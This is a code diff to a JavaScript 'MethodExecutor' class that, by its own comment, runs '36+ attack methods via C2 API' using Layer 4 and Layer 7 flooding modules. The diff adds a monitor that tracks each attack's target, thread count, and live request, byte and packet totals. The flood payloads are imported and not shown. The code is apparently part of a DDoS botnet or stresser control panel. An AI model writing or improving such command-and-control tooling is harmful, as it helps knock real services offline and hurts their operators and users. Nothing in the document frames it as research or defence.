@@ -3,6 +3,7 @@ import { LAYER7_METHODS } from '../methods/layer7/index.js';
 import * as Layer4 from '../methods/layer4/index.js';
 import * as Layer7 from '../methods/layer7/index.js';
 import { logger } from '../utils/logger.js';
+import { attackMonitor } from './monitor.js';
 
 /**
  * Method Executor - Execute semua 36+ attack methods via C2 API
@@ -149,6 +150,13 @@ export class MethodExecutor {
                 config: { target, threads, duration, rpc }
             });
 
+            // Register with monitor
+            attackMonitor.registerAttack(attackId, {
+                method: methodUpper,
+                target,
+                threads
+            });
+
             // Start all attack instances
             logger.info(`   Starting ${numInstances} attack instances...`);
             attacks.forEach(attack => {
@@ -165,12 +173,36 @@ export class MethodExecutor {
                         return;
                     }
 
-                    const stats = { totalRequests: 0, successfulRequests: 0, failedRequests: 0 };
+                    // Collect real stats from all attack instances
+                    const attackData = this.activeAttacks.get(attackId);
+                    const stats = { 
+                        totalRequests: 0, 
+                        successfulRequests: 0, 
+                        failedRequests: 0,
+                        totalBytes: 0,
+                        totalPackets: 0
+                    };
+                    
+                    if (attackData && attackData.attacks) {
+                        attackData.attacks.forEach(attack => {
+                            if (attack.stats) {
+                                stats.totalRequests += attack.stats.totalRequests || 0;
+                                stats.successfulRequests += attack.stats.successfulRequests || 0;
+                                stats.failedRequests += attack.stats.failedRequests || 0;
+                                stats.totalBytes += attack.stats.totalBytes || 0;
+                                stats.totalPackets += attack.stats.totalPackets || 0;
+                            }
+                        });
+                    }
+                    
+                    // Update monitor
+                    attackMonitor.updateAttack(attackId, stats);
+                    
                     onProgress({
                         attackId,
                         method: methodUpper,
                         stats,
-                        elapsed: Math.floor((Date.now() - this.activeAttacks.get(attackId).startTime) / 1000)
+                        elapsed: Math.floor((Date.now() - attackData.startTime) / 1000)
                     });
                 }, 5000);
 
@@ -180,10 +212,25 @@ export class MethodExecutor {
 
             // Wait for completion
             setTimeout(async () => {
+                // Collect final stats from all attack instances
+                const attackData = this.activeAttacks.get(attackId);
                 const finalStats = { totalRequests: 0, successfulRequests: 0, failedRequests: 0 };
+                
+                if (attackData && attackData.attacks) {
+                    attackData.attacks.forEach(attack => {
+                        if (attack.stats) {
+                            finalStats.totalRequests += attack.stats.totalRequests || 0;
+                            finalStats.successfulRequests += attack.stats.successfulRequests || 0;
+                            finalStats.failedRequests += attack.stats.failedRequests || 0;
+                        }
+                    });
+                }
                 
                 logger.success(`✅ ${methodUpper} attack completed!`);
                 logger.info(`   Duration: ${duration}s with ${threads} threads`);
+
+                // Unregister from monitor
+                attackMonitor.unregisterAttack(attackId);
 
                 // Cleanup
                 this.activeAttacks.delete(attackId);
@@ -428,17 +475,26 @@ export class MethodExecutor {
         }
 
         const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
+        
+        // Collect real stats from all attack instances
+        const stats = { totalRequests: 0, successfulRequests: 0, failedRequests: 0 };
+        
+        if (attackData.attacks) {
+            attackData.attacks.forEach(attack => {
+                if (attack.stats) {
+                    stats.totalRequests += attack.stats.totalRequests || 0;
+                    stats.successfulRequests += attack.stats.successfulRequests || 0;
+                    stats.failedRequests += attack.stats.failedRequests || 0;
+                }
+            });
+        }
 
         return {
             attackId,
             method: attackData.method,
             target: attackData.config.target,
             elapsed,
-            stats: {
-                totalRequests: 0,
-                successfulRequests: 0,
-                failedRequests: 0
-            }
+            stats
         };
     }
 }
